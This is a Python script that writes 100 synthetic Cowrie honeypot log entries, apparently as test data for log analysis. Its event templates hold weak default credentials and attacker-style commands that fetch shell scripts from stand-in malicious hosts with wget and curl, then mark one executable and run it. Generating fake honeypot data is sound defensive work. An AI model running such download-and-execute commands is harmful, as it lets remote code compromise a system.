import json
from random import choice, randint
from datetime import datetime, timedelta

event_types = [
    {"eventid": "cowrie.login.failed", "username": "admin", "password": "admin123"},
    {"eventid": "cowrie.login.failed", "username": "root", "password": "toor"},
    {"eventid": "cowrie.login.success", "username": "admin", "password": "letmein"},
    {"eventid": "cowrie.command.input", "input": "uname -a"},
    {"eventid": "cowrie.command.input", "input": "wget http://malicious-site.com/payload.sh"},
    {"eventid": "cowrie.command.input", "input": "curl http://malicious.cx/evil.sh"},
    {"eventid": "cowrie.command.input", "input": "chmod +x payload.sh && ./payload.sh"}
]

src_ips = ["192.168.1.50", "10.10.10.10", "172.16.0.5", "8.8.8.8"]

logs = []
timestamp = datetime.utcnow()

for i in range(100):
    base = choice(event_types)
    event = {
        "timestamp": (timestamp + timedelta(seconds=i * 5)).isoformat() + "Z",
        "eventid": base["eventid"],
        "src_ip": choice(src_ips)
    }
    if "username" in base:
        event["username"] = base["username"]
        event["password"] = base["password"]
    if "input" in base:
        event["input"] = base["input"]
    logs.append(json.dumps(event))

with open("cowrie.json", "w") as f:
    for line in logs:
        f.write(line + "\n")

print("cowrie.json created with 100 logs.")
